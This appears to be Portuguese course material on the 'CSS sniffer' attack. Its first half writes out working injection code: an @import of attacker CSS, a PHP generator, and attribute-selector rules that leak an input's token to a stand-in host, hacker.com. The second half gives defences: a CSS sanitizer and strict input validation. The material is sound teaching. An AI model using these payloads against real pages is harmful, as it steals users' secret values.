# Code Examples: CSS Sniffer

## Exemplo completo do ataque (da aula)

### Pagina vitima (index.html)

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    input {
      display: block;
      width: 125px;
      font-size: 48px;
      margin: 10px auto;
      text-align: center;
    }
  </style>
  <!-- CSS injetado pelo atacante -->
  <style>
    @import url("http://hacker.com/inject.php");
  </style>
</head>
<body>
  <!-- Token secreto exibido para o usuario -->
  <input type="text" value="1234" />
</body>
</html>
```

### Servidor do atacante (inject.php)

```php
<?php
header("Content-Type: text/css");

for ($i = 0; $i < 10000; $i++) {
    echo "input[value=\"$i\"] { background: url(\"http://hacker.com/$i.png\"); }\n";
}
?>
```

### CSS gerado pelo PHP (amostra)

```css
input[value="0"] { background: url("http://hacker.com/0.png"); }
input[value="1"] { background: url("http://hacker.com/1.png"); }
input[value="2"] { background: url("http://hacker.com/2.png"); }
/* ... */
input[value="1234"] { background: url("http://hacker.com/1234.png"); }
/* ... */
input[value="9999"] { background: url("http://hacker.com/9999.png"); }
```

### O que aparece nos logs do atacante

```
GET /1234.png HTTP/1.1
Host: hacker.com
Referer: http://victim.com/dashboard
```

O atacante sabe que o token e "1234".

## Versao sofisticada com seletores granulares

```css
/* Exfiltracao caractere por caractere */
input[value^="a"] { background: url("http://hacker.com/pos0=a"); }
input[value^="b"] { background: url("http://hacker.com/pos0=b"); }
/* ... */
input[value^="aa"] { background: url("http://hacker.com/pos01=aa"); }
input[value^="ab"] { background: url("http://hacker.com/pos01=ab"); }
/* ... */
input[value$="z"] { background: url("http://hacker.com/last=z"); }
input[value$="yz"] { background: url("http://hacker.com/last2=yz"); }
```

## Defesas em codigo

### Sanitizador de CSS basico (TypeScript)

```typescript
import * as csstree from 'css-tree';

interface SanitizeOptions {
  allowedProperties: string[];
  blockAtRules: boolean;
  blockUrls: boolean;
  blockAttributeSelectors: boolean;
}

function sanitizeCss(rawCss: string, options: SanitizeOptions): string {
  const ast = csstree.parse(rawCss, { parseAtrulePrelude: false });

  csstree.walk(ast, {
    enter(node, item, list) {
      // Bloquear @import, @font-face, etc.
      if (options.blockAtRules && node.type === 'Atrule') {
        list.remove(item);
        return;
      }

      // Bloquear url() em qualquer valor
      if (options.blockUrls && node.type === 'Url') {
        list.remove(item);
        return;
      }

      // Bloquear seletores de atributo [value^=...]
      if (options.blockAttributeSelectors && node.type === 'AttributeSelector') {
        list.remove(item);
        return;
      }

      // Allowlist de propriedades
      if (node.type === 'Declaration') {
        if (!options.allowedProperties.includes(node.property)) {
          list.remove(item);
        }
      }
    }
  });

  return csstree.generate(ast);
}
```

### Validacao de cor no servidor (Express)

```typescript
app.post('/settings/theme-color', (req, res) => {
  const { color } = req.body;

  // Validar formato hex estrito
  const hexColorRegex = /^#[0-9a-fA-F]{6}$/;
  if (!hexColorRegex.test(color)) {
    return res.status(400).json({ error: 'Formato de cor invalido. Use #RRGGBB.' });
  }

  // Seguro para usar em CSS
  db.updateUserColor(req.user.id, color);
  res.json({ success: true });
});
```

### Validacao de nome de tema (Express)

```typescript
const ALLOWED_THEMES = ['light', 'dark', 'blue', 'green'] as const;
type Theme = typeof ALLOWED_THEMES[number];

app.post('/settings/theme', (req, res) => {
  const { theme } = req.body;

  if (!ALLOWED_THEMES.includes(theme)) {
    return res.status(400).json({
      error: `Tema invalido. Permitidos: ${ALLOWED_THEMES.join(', ')}`
    });
  }

  // Seguro para usar em @import
  // Resultado: @import url("/themes/dark.css")
  db.updateUserTheme(req.user.id, theme);
  res.json({ success: true });
});
```